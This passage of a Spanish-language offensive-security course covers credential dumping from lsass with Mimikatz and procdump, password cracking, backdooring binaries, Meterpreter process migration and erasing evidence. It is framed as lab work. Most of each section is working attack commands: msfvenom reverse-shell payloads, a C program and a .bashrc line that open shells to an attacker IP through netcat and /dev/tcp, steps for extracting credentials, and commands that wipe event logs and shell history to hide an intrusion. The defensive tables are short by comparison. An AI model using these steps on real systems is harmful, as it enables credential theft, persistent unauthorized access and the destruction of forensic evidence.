### 🛡️ ¿Cómo protegerse?

| Riesgo                        | Mitigación                                        |
| ----------------------------- | ------------------------------------------------- |
| Contraseñas en texto plano    | Usa Windows Hello y no almacenarlas en memoria    |
| Mimikatz ejecutándose         | Bloquear herramientas con EDR, antivirus          |
| Acceso a LSASS                | Activar **LSA Protection** en Windows             |
| Usuario con derechos elevados | Aplicar principio de menor privilegio             |
| Volcado de LSASS permitido    | Bloquear permisos de `rundll32`, `procdump`, etc. |

---

### 🔒 Activar LSA Protection en Windows

Protege LSASS contra accesos como los de Mimikatz:

```reg
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "1" /f
```

Reinicia Windows.

Mimikatz ya no podrá leer las credenciales sin un **exploit del kernel**.

---

### ✅ RESUMEN RÁPIDO

| Acción                     | Comando (Mimikatz)                      |
| -------------------------- | --------------------------------------- |
| Elevar privilegios         | `privilege::debug`                      |
| Leer credenciales          | `sekurlsa::logonpasswords`              |
| Volcado externo de memoria | `rundll32 comsvcs.dll, MiniDump ...`    |
| Leer archivo `.dmp`        | `sekurlsa::minidump` + `logonpasswords` |

---

### 📦 BONUS: Herramientas adicionales

| Herramienta            | Uso principal                               |
| ---------------------- | ------------------------------------------- |
| `procdump`             | Crear volcados de memoria con firma oficial |
| `Windows Sysinternals` | Monitoreo de procesos como LSASS            |
| `pypykatz`             | Alternativa en Python a Mimikatz            |

---

[🔼](#índice)

---

## **89. Procdump y lsass.exe**

### 🧠 ¿Qué es `lsass.exe`?

`lsass.exe` significa **Local Security Authority Subsystem Service**.
Es un proceso de Windows encargado de:

- Validar inicios de sesión.
- Manejar contraseñas.
- Almacenar temporalmente las **credenciales en memoria**.

💡 **Si un atacante puede acceder a la memoria de `lsass.exe`, puede robar contraseñas.**

---

### 🧰 ¿Qué es `Procdump`?

`Procdump` es una herramienta de Microsoft (Sysinternals) que sirve para:

- Hacer **volcados de memoria** (memory dumps) de procesos.
- Identificar bloqueos o errores.
- Usada por atacantes para **dumper lsass.exe y extraer credenciales**.

✅ _Ventaja_: Es una herramienta **legítima y firmada por Microsoft**, lo que le permite evitar muchos antivirus.

---

### 📦 Instalación de `Procdump`

#### Requisitos:

- Máquina virtual Windows 10 (víctima).
- Usuario con privilegios de administrador.
- Máquina Kali Linux (atacante) si quieres analizar con Mimikatz.

#### 📥 Descarga `Procdump`

1. Ve a:
   [https://learn.microsoft.com/en-us/sysinternals/downloads/procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

2. Descarga y descomprime el `.zip`.

3. Abre una terminal (`cmd`) como **administrador** en esa carpeta.

---

### 🔐 ¿Cómo volcar `lsass.exe`?

#### Paso 1: Encuentra el PID de `lsass.exe`

```cmd
tasklist | findstr lsass
```

📌 Ejemplo de salida:

```
lsass.exe                 644 Services                   0     8,240 K
```

> El número `644` es el **PID** (puede variar).

---

#### Paso 2: Crear el volcado con `procdump`

Ejecuta:

```cmd
procdump -accepteula -ma 644 C:\Users\Public\lsass.dmp
```

🔍 Detalle de parámetros:

- `-accepteula`: Acepta automáticamente la licencia.
- `-ma`: Crea un volcado completo (Full Dump).
- `644`: Es el PID de `lsass.exe`.
- `C:\Users\Public\lsass.dmp`: Ruta donde se guarda el archivo.

✅ Esto genera un volcado con toda la memoria de LSASS.

---

### 🧪 Análisis del volcado (desde Kali o en la misma VM)

Puedes analizar el volcado de 2 formas:

---

#### 🧩 OPCIÓN 1: Usar Mimikatz en la misma máquina

1. Abre `mimikatz.exe` como administrador.

2. Ejecuta:

```mimikatz
sekurlsa::minidump C:\Users\Public\lsass.dmp
sekurlsa::logonpasswords
```

✅ Verás las credenciales que estaban activas en memoria:

```
Username : admin
Domain   : DESKTOP-123
Password : Contraseña123
```

---

#### 🧩 OPCIÓN 2: Analizar desde Kali Linux

1. Copia el archivo `.dmp` a tu Kali (por red, USB, o compartido).
2. Usa `pypykatz` para analizarlo:

```bash
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

✅ Resultado similar a Mimikatz pero sin usar Windows.

---

### ⚠️ Importante: ¿Qué necesitas para que funcione?

| Requisito                   | Motivo                                                |
| --------------------------- | ----------------------------------------------------- |
| Ejecutar como administrador | Acceso a leer la memoria de `lsass.exe`.              |
| Defender desactivado        | Procdump y Mimikatz suelen ser bloqueados.            |
| Mismo idioma                | Mimikatz a veces falla en idiomas que no sean inglés. |

---

### 🛡️ ¿Cómo defenderse de esto?

| Riesgo                                       | Solución                                                          |
| -------------------------------------------- | ----------------------------------------------------------------- |
| Acceso a `lsass.exe`                         | Activar **LSA Protection** (`RunAsPPL`)                           |
| Procdump legítimo usado con fines maliciosos | Bloquear herramientas de Sysinternals si no se usan en producción |
| Usuarios con admin innecesario               | Aplicar principio de menor privilegio                             |

---

### 🔒 Activar Protección de LSASS (opcional)

Impedirá volcados sin exploits del kernel:

```reg
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "RunAsPPL" /t REG_DWORD /d "1" /f
```

➡️ Luego **reinicia** el sistema.

---

### 🧪 DEMO PRÁCTICA EN VM (Resumen)

1. En VM Windows, inicia sesión con usuario `admin` y contraseña `Prueba123`.
2. Abre CMD como admin.
3. Ejecuta `tasklist | findstr lsass` → copia el PID.
4. Ejecuta:

```cmd
procdump -accepteula -ma <PID> C:\lsass.dmp
```

5. Abre `mimikatz.exe`:

```mimikatz
sekurlsa::minidump C:\lsass.dmp
sekurlsa::logonpasswords
```

✅ Deberías ver la contraseña `Prueba123`.

---

### ✅ RESUMEN

| Herramienta    | Uso Principal                               |
| -------------- | ------------------------------------------- |
| `lsass.exe`    | Guarda credenciales activas en RAM          |
| `procdump.exe` | Crea volcados de procesos de forma legal    |
| `mimikatz.exe` | Extrae contraseñas desde memoria o volcados |
| `pypykatz`     | Alternativa en Linux a Mimikatz             |

---

[🔼](#índice)

---

## **90. Cracking de contraseñas: John the ripper y Hashcat**

### 📌 ¿Qué es el "cracking de contraseñas"?

El **cracking de contraseñas** es el proceso de **descifrar** (romper) contraseñas ocultas o cifradas (como hashes) usando:

- **Fuerza bruta** (probar todas las combinaciones posibles).
- **Diccionarios** (usar una lista de contraseñas comunes).
- **Ataques híbridos o de reglas** (modificar palabras de diccionario con símbolos, números, etc.).

---

### 🎯 ¿Qué son John the Ripper y Hashcat?

| Herramienta         | Descripción breve                                                                                                                      |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **John the Ripper** | Herramienta tradicional, potente y flexible, útil en sistemas Linux y Unix. Puede crackear muchos tipos de hashes.                     |
| **Hashcat**         | Crackeador avanzado y rápido que **usa GPU** para acelerar el proceso. Muy eficiente para hashes complejos como NTLM, bcrypt, SHA-512. |

---

### 🖥️ Laboratorio: Máquinas virtuales

- **Atacante**: Kali Linux (última versión)
- **Víctima**: Linux o Windows, desde donde extraes los hashes (ej. `/etc/shadow`, `SAM`)

---

### 🔧 Instalación en Kali Linux (VM)

#### ✅ John the Ripper

Ya viene preinstalado en Kali:

```bash
john --version
```

Si no, instala con:

```bash
sudo apt update
sudo apt install john
```

---

#### ✅ Hashcat

Verifica si ya está:

```bash
hashcat --version
```

Instala con:

```bash
sudo apt install hashcat
```

Para soporte de GPU (opcional): necesitas controladores NVIDIA/CUDA instalados.

---

### 🧪 Ejemplo 1: Cracking con John the Ripper (Linux)

### 🎯 Objetivo: Crackear un hash de contraseña Linux (`/etc/shadow`)

#### Paso 1: Extraer el hash

En la máquina víctima (Linux), saca una línea de `/etc/shadow` (requiere root):

```
usuario:$6$123456$8Qo6yZxiWiQz0Z...:19384:0:99999:7:::
```

💡 Ese es un hash **SHA-512** (empieza con `$6$`).

#### Paso 2: Guarda el hash en un archivo:

```bash
echo 'usuario:$6$123456$8Qo6yZxiWiQz0Z...' > hash.txt
```

#### Paso 3: Usa un diccionario (como rockyou.txt)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

🕒 John intentará todas las palabras del diccionario.

#### Ver resultado:

```bash
john --show hash.txt
```

---

### 🧪 Ejemplo 2: Cracking con Hashcat (Windows hashes)

#### 🎯 Objetivo: Crackear un hash NTLM (de Windows)

Ejemplo hash NTLM (de `SAM` con Mimikatz):

```
aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

🔍 Ese hash representa la contraseña **password**.

#### Paso 1: Guarda el hash

```bash
echo 5f4dcc3b5aa765d61d8327deb882cf99 > hash.txt
```

#### Paso 2: Usa Hashcat

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

🧠 Explicación:

- `-m 0`: Tipo de hash = MD5 (NTLM es `-m 1000`)
- `-a 0`: Modo ataque = diccionario
- `rockyou.txt`: Lista de palabras comunes

#### Ver resultado:

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
```

---

### 🧪 Tipo de Hashes compatibles

| Hash            | John | Hashcat | Modo Hashcat |
| --------------- | ---- | ------- | ------------ |
| MD5             | ✅   | ✅      | 0            |
| NTLM (Windows)  | ✅   | ✅      | 1000         |
| SHA-1           | ✅   | ✅      | 100          |
| SHA-512 (Linux) | ✅   | ✅      | 1800         |
| bcrypt          | ✅   | ✅      | 3200         |
| WPA/WPA2        | ✅   | ✅      | 2500/22000   |

---

### 💡 Tipos de ataques en Hashcat

| Tipo         | Código `-a` | Descripción                            |
| ------------ | ----------- | -------------------------------------- |
| Diccionario  | `0`         | Usa un archivo con muchas contraseñas  |
| Combinación  | `1`         | Combina dos diccionarios               |
| Fuerza bruta | `3`         | Prueba todas las combinaciones (lento) |
| Reglas       | `0 + -r`    | Aplica reglas sobre diccionarios       |
| Hybrid       | `6`, `7`    | Diccionario + caracteres extras        |

---

### 🧱 Consejos y buenas prácticas

✅ Usa **rockyou.txt**:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

✅ Para contraseñas simples, John es suficiente.

✅ Para hashes complejos, usa Hashcat con GPU (más rápido).

✅ Puedes exportar hashes desde otras herramientas: **Mimikatz**, **samdump2**, **unshadow**, etc.

---

### 🛡️ ¿Cómo defenderse?

| Riesgo                       | Mitigación                                         |
| ---------------------------- | -------------------------------------------------- |
| Contraseñas débiles          | Usar contraseñas largas y complejas                |
| Hashes mal almacenados       | Usar algoritmos modernos como Argon2, bcrypt       |
| Hash robado desde la máquina | Evitar privilegios innecesarios y cifrar disco     |
| Ataques por diccionario      | Agregar políticas de bloqueo por intentos fallidos |

---

### ✅ RESUMEN FINAL

| Herramienta     | Mejor uso                    | Ventajas               |
| --------------- | ---------------------------- | ---------------------- |
| John the Ripper | Linux, Unix, ataques simples | Ligero, fácil de usar  |
| Hashcat         | Hashes complejos, GPU        | Ultra rápido, flexible |

---

[🔼](#índice)

---

## **91. Backdoors en binarios**

### 🧠 ¿Qué es un backdoor?

Un **backdoor (puerta trasera)** es una forma secreta de acceder a un sistema o programa **saltándose la autenticación** o los controles normales.
Cuando se inserta un backdoor en un **binario** (archivo ejecutable), se modifica el programa para que incluya un **comportamiento oculto malicioso**.

---

### 🧨 ¿Qué es un _binario backdooreado_?

Un binario backdooreado es un archivo ejecutable legítimo (como `ls`, `ping`, o un instalador `.exe`) que ha sido **modificado para incluir código malicioso**, como por ejemplo:

- Una **shell reversa** al abrir el archivo.
- Crear un **usuario oculto** en el sistema.
- Descargar y ejecutar otro malware.

---

### 🎯 Objetivo del laboratorio

💻 Usaremos **dos máquinas virtuales**:

| Rol      | Sistema operativo |
| -------- | ----------------- |
| Atacante | Kali Linux        |
| Víctima  | Ubuntu o Windows  |

### Usaremos herramientas como:

- `msfvenom` (crear payloads)
- `backdoor-factory` o `injector.py` (insertar payloads en binarios)
- `netcat` o Metasploit (recibir la conexión)

---

### ⚙️ INSTALACIÓN DEL LABORATORIO EN MÁQUINAS VIRTUALES

#### 🧑‍💻 En la VM Kali Linux (Atacante):

```bash
sudo apt update
sudo apt install metasploit-framework netcat
```

Verifica que Metasploit esté funcionando:

```bash
msfconsole
```

Opcional: Instala `backdoor-factory` o usa `msfvenom` con binarios ya hechos.

---

### 🚧 PREPARACIÓN: Crear un binario con backdoor (ejemplo con `msfvenom`)

#### 1. Crear un binario infectado para Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe -o archivo_infectado.exe
```

📌 Explicación:

- `-p`: Payload = meterpreter reverso para Windows
- `LHOST`: IP de tu máquina atacante (Kali)
- `LPORT`: Puerto por el que escucharás
- `-f exe`: Formato ejecutable
- `-o`: Salida

---

### 📥 EJEMPLO PRÁCTICO: Modificar un binario Linux legítimo

Supón que tienes un archivo binario legítimo, como `ls`:

```bash
cp /bin/ls ls_original
```

#### Opcional: Insertar un payload en el binario usando `injector.py` (manual)

Esto es más avanzado, pero puedes compilar un payload en C y unirlo al binario. Un ejemplo más simple es:

```c
// payload.c
#include <stdlib.h>
int main() {
  system("nc -e /bin/bash 192.168.100.10 4444");
  return 0;
}
```

Compila:

```bash
gcc payload.c -o payload
```

Ahora podrías combinar ambos con herramientas de empaquetado o incluso hacer ingeniería inversa con `objcopy` (tema más avanzado).

---

### 🚀 ENVÍO Y EJECUCIÓN EN LA MÁQUINA VÍCTIMA

1. Transfiere el archivo `archivo_infectado.exe` o binario modificado a la víctima.

   - Por red, USB, carpeta compartida, `python3 -m http.server`, etc.

2. En la Kali, escucha con Netcat o Metasploit:

#### Opción A: Netcat

```bash
nc -nlvp 4444
```

#### Opción B: Metasploit

```bash
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.10
set LPORT 4444
exploit
```

3. En la VM víctima, ejecuta el archivo.

🎉 ¡Obtendrás una shell reversa de la víctima!

---

### 🔎 ¿Cómo detectar un binario backdooreado?

- Con `strings`, `file`, `ltrace` o `strace` en Linux.
- Comparar el `hash` del binario con uno original (`sha256sum`).
- Usar antivirus o escáner de comportamiento.

---

### 🧪 OTRO EJEMPLO: Backdoor persistente en binario Linux

1. Modifica un script ejecutable que siempre se ejecuta (como un cron o `.bashrc`)
2. Añade esto al principio:

```bash
bash -i >& /dev/tcp/192.168.100.10/4444 0>&1
```

3. Cierra sesión o reinicia: cuando alguien use el sistema, se abrirá la conexión.

---

### ⚠️ CONSEJOS DE SEGURIDAD

| Riesgo                            | Contramedida                            |
| --------------------------------- | --------------------------------------- |
| Binarios modificados              | Verificar firmas y hashes (`sha256sum`) |
| Backdoors en binarios del sistema | Reinstalar desde fuentes confiables     |
| Puertas traseras persistentes     | Revisar `.bashrc`, cronjobs y servicios |

---

### 🧱 ¿Dónde aplicar este conocimiento?

| Entorno             | Uso                                                     |
| ------------------- | ------------------------------------------------------- |
| Pentesting ético    | Validar la resistencia de sistemas a binarios alterados |
| Forense             | Detectar malware embebido                               |
| CTFs (Capture Flag) | Extraer shells de binarios ocultos                      |

---

### ✅ RESUMEN

| Concepto            | Explicación breve                            |
| ------------------- | -------------------------------------------- |
| Backdoor en binario | Programa modificado para abrir acceso oculto |
| Herramientas usadas | msfvenom, netcat, metasploit, gcc, bash      |
| Plataformas         | Linux y Windows                              |
| Prevención          | Hashes, firmas, monitoreo de comportamiento  |

---

[🔼](#índice)

---

## **92. Migración de meterpreter a otro proceso**

### 🔍 Definición:

Cuando se obtiene una **shell Meterpreter** en un sistema víctima (normalmente Windows), se está ejecutando dentro del **proceso inicial comprometido** (por ejemplo, `notepad.exe`, `calc.exe` o un archivo infectado).

🔁 La **migración de procesos** permite mover esa sesión a otro proceso que:

- Tenga más **permisos** (por ejemplo: `explorer.exe` o `winlogon.exe`).
- Sea más **estable** (no cierre inesperadamente).
- Sea más **silencioso** (para evadir antivirus o EDR).

---

### 💻 Laboratorio práctico (usando máquinas virtuales)

#### 🖥️ Requisitos:

| Máquina    | Sistema Operativo | Rol                       |
| ---------- | ----------------- | ------------------------- |
| Kali Linux | Kali              | Atacante (con Metasploit) |
| Windows 10 | Windows           | Víctima                   |

---

### 🔧 Paso a paso: Instalación y preparación

#### 1️⃣ En Kali Linux (Atacante)

Asegúrate de tener Metasploit:

```bash
sudo apt update
sudo apt install metasploit-framework
```

Verifica:

```bash
msfconsole
```

---

#### 2️⃣ En la máquina víctima Windows

Puedes usar un ejecutable generado con `msfvenom`.

### Generar payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f exe -o shell_win.exe
```

> ⚠️ Cambia `LHOST` por la IP de tu Kali.

Transfiere `shell_win.exe` a la VM Windows (por carpeta compartida o servidor HTTP).

---

### 🎯 Objetivo: Migrar el proceso una vez obtenida la sesión

---

#### 3️⃣ En Kali: Configura el listener (Metasploit)

```bash
msfconsole
```

```ruby
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.5
set LPORT 4444
exploit
```

---

#### 4️⃣ En Windows: Ejecuta el payload

Ve a la carpeta donde copiaste `shell_win.exe` y haz doble clic.

🟢 En Kali verás que aparece una sesión activa:

```bash
meterpreter >
```

---

### 🔁 Migración de procesos en Meterpreter

#### Paso 1: Ver procesos activos

```bash
ps
```

Verás una lista como:

```
PID   Name             Arch  Session  User
1000  explorer.exe     x64   1        WIN10\User
1200  svchost.exe      x64   0        SYSTEM
1340  notepad.exe      x64   1        WIN10\User
```

#### Paso 2: Elegir un proceso estable

🧠 Recomiendo `explorer.exe` (está casi siempre activo y con permisos útiles).

Supón que el PID de `explorer.exe` es `1000`.

#### Paso 3: Migrar al nuevo proceso

```bash
migrate 1000
```

🎉 Si todo sale bien:

```
[*] Migrating from 1340 to 1000...
[*] Migration completed successfully.
```

Ahora estás “dentro” del proceso `explorer.exe`, lo cual te da más persistencia y reduce la probabilidad de ser detectado.

---

### 📌 ¿Por qué es útil migrar?

| Motivo                       | Ejemplo                                                                |
| ---------------------------- | ---------------------------------------------------------------------- |
| 🔐 Obtener más permisos      | Migrar a proceso `SYSTEM` (como `lsass.exe`) para dumpear contraseñas  |
| 💥 Evitar cierre del proceso | Si infectaste `notepad.exe` y el usuario lo cierra, perderás la sesión |
| 🕵️‍♂️ Evasión de antivirus      | Migrar a procesos comunes y firmados                                   |
| 🔄 Estabilidad               | `explorer.exe` siempre está activo                                     |

---

### ⚠️ Recomendaciones

- ❌ No migres a procesos críticos como `csrss.exe` o `wininit.exe`: puedes crashear el sistema.
- ✅ Usa `explorer.exe`, `svchost.exe` o cualquier proceso activo de usuario.
- 🔍 Antes de migrar, usa `ps` para ver cuál pertenece al usuario o al sistema.

---

### 🧪 Tip extra: Elevar privilegios antes de migrar

Si quieres migrar a procesos como `lsass.exe`, primero necesitas privilegios SYSTEM:

```bash
getuid
# Si no eres SYSTEM, intenta:
run post/windows/escalate/getsystem
```

Después:

```bash
ps
migrate <pid_de_lsass>
```

---

### 🛡️ ¿Cómo defenderse?

| Técnica ofensiva      | Defensa posible                                       |
| --------------------- | ----------------------------------------------------- |
| Migración de procesos | HIPS/EDR que detecten inyecciones de procesos         |
| Uso de Meterpreter    | Antivirus actualizado, restricciones de ejecución     |
| Persistencia          | Monitorización de procesos con comportamiento anormal |

---

### ✅ Resumen final

| Acción               | Comando clave   |
| -------------------- | --------------- |
| Ver procesos activos | `ps`            |
| Migrar al proceso    | `migrate <PID>` |
| Elevar privilegios   | `run getsystem` |
| Comprobar usuario    | `getuid`        |

---

[🔼](#índice)

---

## **93. Borrado de evidencias**

### 🧠 ¿Qué es el _borrado de evidencias_?

Es el proceso mediante el cual un atacante (o pentester) **elimina rastros** de su actividad para:

- Evitar ser detectado.
- Ocultar la intrusión.
- Dificultar análisis forense.

Este proceso es una fase **crítica en la post-explotación**, especialmente en pruebas de penetración que simulan ataques reales (**Red Team**).

---

### ⚠️ Importante (ética y legalidad)

Este conocimiento se usa **solo en entornos controlados o con autorización explícita**. El uso indebido es **ilegal**.

---

### 💻 LABORATORIO EN MÁQUINAS VIRTUALES

| Máquina    | Sistema Operativo | Rol              |
| ---------- | ----------------- | ---------------- |
| Kali Linux | Kali              | Atacante         |
| Windows 10 | Windows           | Víctima          |
| (Opcional) | Ubuntu            | Segundo objetivo |

---

### 🔧 Instalación y herramientas necesarias

#### En Kali Linux:

```bash
sudo apt update
sudo apt install metasploit-framework netcat
```

También puedes usar:

- `meterpreter` (desde Metasploit)
- `clearev` (comando para borrar logs)
- `bypassuac`, `getsystem` (para privilegios antes de borrar)

---

### 🔍 Tipos de evidencias que se pueden borrar

| Evidencia                       | Herramienta / Acción                  |
| ------------------------------- | ------------------------------------- |
| Logs del sistema (event logs)   | `clearev` (Meterpreter)               |
| Comandos ejecutados (historial) | `.bash_history`, PowerShell history   |
| Archivos residuales             | `rm`, `sdelete`, `shred`              |
| Persistencia creada             | Eliminar registros, servicios, claves |
| Conexiones en memoria           | Finalizar procesos                    |

---

### ✅ Caso práctico: Uso de `Meterpreter` para borrar evidencias

#### 1. Obtener acceso Meterpreter

(Suponiendo que ya has enviado un payload con `msfvenom`)

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.5
set LPORT 4444
exploit
```

#### 2. Verificar que tienes la sesión

```bash
sessions
sessions -i 1
```

---

#### 3. Borrar logs del sistema con `clearev`

```bash
meterpreter > clearev
```

🔒 Esto borra:

- Logs de seguridad
- Logs de aplicación
- Logs del sistema

📌 Solo funciona con privilegios elevados.

---

#### 4. Elevar privilegios si no puedes borrar logs

```bash
getuid
run post/windows/escalate/getsystem
```

Si ya eres SYSTEM, puedes correr `clearev`.

---

### 🧪 Otros métodos: Borrar rastros manualmente

#### 🪟 En Windows:

- Borrar archivos temporales:

```powershell
del /f /s /q %temp%\*
```

- Borrar historial de PowerShell:

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

- Borrar eventos manualmente (requiere permisos):

```powershell
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

---

#### 🐧 En Linux:

- Borrar historial de comandos:

```bash
history -c
rm ~/.bash_history
```

- Borrar logs:

```bash
sudo rm -f /var/log/auth.log
sudo rm -f /var/log/syslog
sudo rm -f /var/log/wtmp
```

- Borrar archivos con sobreescritura (más seguro):

```bash
shred -u archivo.txt
```

- También puedes usar:

```bash
wipe archivo.txt
```

(O instala con `sudo apt install wipe`)

---

### 🔐 Borrar persistencia o malware

Si dejaste una puerta trasera (servicio, clave de registro, cronjob, etc.), debes **eliminarla** para borrar el rastro completo.

- En Windows:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /f
```

- En Linux:

```bash
crontab -r  # Elimina cronjobs
rm ~/.config/autostart/backdoor.desktop
```

---

### 🔬 Análisis forense: Cómo te podrían detectar igual

Aunque borres los logs, hay formas de detectar la intrusión:

| Técnica Forense  | Qué encuentra                             |
| ---------------- | ----------------------------------------- |
| Análisis de RAM  | Procesos en ejecución                     |
| Shadow Copies    | Versiones anteriores de archivos          |
| Event Forwarding | Logs ya enviados a otro servidor          |
| Sysmon / EDR     | Detección de actividad por comportamiento |

---

### 🛡️ Recomendaciones defensivas

| Defensa                           | ¿Qué evita?                     |
| --------------------------------- | ------------------------------- |
| Event Forwarding                  | Pérdida de logs locales         |
| EDR con logging persistente       | Detección de actividad anómala  |
| Monitorización de `.bash_history` | Cambios sospechosos en usuarios |
| Backups regulares                 | Restaurar versiones limpias     |

---

### ✅ RESUMEN

| Acción                        | Herramienta / Comando                    |
| ----------------------------- | ---------------------------------------- |
| Borrar logs Windows           | `clearev`, `wevtutil`                    |
| Borrar historial de shell     | `history -c`, `.bash_history`            |
| Borrar archivos               | `rm`, `shred`, `wipe`                    |
| Borrar registros persistentes | `reg delete`, `crontab -r`               |
| Elevar privilegios            | `getsystem`, `run post/windows/escalate` |

---

[🔼](#índice)

---

## **94. Archivos relevantes para eliminar**

### 🎯 Objetivo:

Entender **qué archivos debemos borrar** luego de un ataque o prueba de penetración para:

- Evitar dejar rastros.
- Eliminar evidencias.
- Simular a un atacante real en un ejercicio de Red Team o pentesting.

> ⚠️ **Nota legal y ética**: Esta información es para **uso educativo** en entornos controlados. Utilizarla sin autorización es **ilegal y sancionable**.

---

### 🔧 ENTORNO DE PRUEBA (máquinas virtuales)

| Máquina    | Sistema | Rol      |
| ---------- | ------- | -------- |
| Kali Linux | Kali    | Atacante |
| Windows 10 | Windows | Víctima  |
| Ubuntu VM  | Linux   | Víctima  |

---

### 🗂️ TIPOS DE ARCHIVOS RELEVANTES PARA ELIMINAR

Estos son los principales tipos de archivos que debes tener en cuenta:

---

### 🪟 En **Windows**:

#### 1. 🔹 Archivos descargados/infectados

Ejemplos:

- Payloads (`shell.exe`, `reverse.exe`, etc.)
- Archivos .bat, .ps1, .vbs, etc.

🧹 **Eliminar**:

```powershell
del C:\Users\victima\Downloads\shell.exe
```

---

#### 2. 🔹 Archivos de registro de eventos (logs)

Se almacenan en:

- `C:\Windows\System32\winevt\Logs\`

🧹 **Limpiar con PowerShell**:

```powershell
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

---

#### 3. 🔹 Historial de comandos de PowerShell

🧹 **Eliminar historial**:

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

También puedes eliminar manualmente:

```powershell
del C:\Users\victima\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

#### 4. 🔹 Archivos temporales

🧹 **Borrar carpeta TEMP**:

```cmd
del /f /s /q %temp%\*
```

---

#### 5. 🔹 Entradas de persistencia

Borra claves de registro o accesos que hayas creado:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /f
```

---

### 🐧 En **Linux**:

#### 1. 🔹 Payloads o herramientas descargadas

Ejemplo:

```bash
rm -f /home/user/reverse.elf
```

O mejor aún:

```bash
shred -u reverse.elf  # Sobrescribe antes de eliminar
```

---

#### 2. 🔹 Historial de comandos

```bash
history -c
rm ~/.bash_history
```

---

#### 3. 🔹 Logs del sistema

Se almacenan en:

- `/var/log/auth.log`
- `/var/log/syslog`
- `/var/log/wtmp`
- `/var/log/secure` (CentOS)

🧹 **Eliminar logs**:

```bash
sudo rm -f /var/log/auth.log /var/log/syslog /var/log/wtmp
```

---

#### 4. 🔹 Cron jobs (persistencia)

Verificar:

```bash
crontab -l
```

Eliminar:

```bash
crontab -r
```

---

#### 5. 🔹 Archivos de servicios creados

Si creaste un servicio `.service`:

```bash
sudo systemctl stop backdoor.service
sudo rm /etc/systemd/system/backdoor.service
sudo systemctl daemon-reexec
```

---

### 📦 EJEMPLO COMPLETO

#### 🔹 Escenario: has hecho una intrusión con un payload llamado `rev.exe` en Windows.

**Pasos para eliminar rastros:**

1. Borrar el archivo:

```powershell
del C:\Users\victima\Downloads\rev.exe
```

2. Borrar eventos del sistema:

```powershell
wevtutil cl Application
wevtutil cl System
```

3. Borrar historial de PowerShell:

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

4. Borrar temporales:

```cmd
del /f /s /q %temp%\*
```

5. Borrar claves de persistencia (si las dejaste):

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v malware /f
```

---

### 🛑 Herramientas útiles

#### En Windows:

- `Sysinternals SDelete` (borrado seguro):

```cmd
sdelete.exe rev.exe
```

- `clearev` (desde Meterpreter)

#### En Linux:

- `shred`
- `wipe` (`sudo apt install wipe`)
- `logrotate` (para rotar y borrar logs)

---

### 🧠 CONSIDERACIONES FINALES

| Técnica ofensiva     | Defensa posible                         |
| -------------------- | --------------------------------------- |
| Borrado de logs      | Centralización de logs en otro servidor |
| Borrado de historial | Monitorización de actividad del shell   |
| Uso de sdelete/wipe  | Monitorización de acceso a disco        |
| Persistencia         | Monitorear cambios en el registro/cron  |

---

### ✅ RESUMEN TABLA

| Tipo de archivo      | Ruta o Comando                                       |
| -------------------- | ---------------------------------------------------- |
| Payloads             | `rm rev.exe` / `shred rev.exe`                       |
| Logs Windows         | `wevtutil cl Application`                            |
| Logs Linux           | `rm /var/log/auth.log`                               |
| Historial PowerShell | `Remove-Item (Get-PSReadlineOption).HistorySavePath` |
| Historial Bash       | `rm ~/.bash_history`                                 |
| Archivos TEMP        | `%TEMP%\*` / `/tmp/`                                 |
| Claves de registro   | `reg delete`                                         |
| Cronjobs             | `crontab -r`                                         |

---

[🔼](#índice)

---

| **Inicio**         | **atrás 8**                                                     | **Siguiente 10**                                           |
| ------------------ | --------------------------------------------------------------- | ---------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./2_8_Explotacion_y_hacking_de_vulnerabilidades_en_red.md) | [⏩](./2_10_Machine_Learning_aplicado_a_Ciberseguridad.md) |
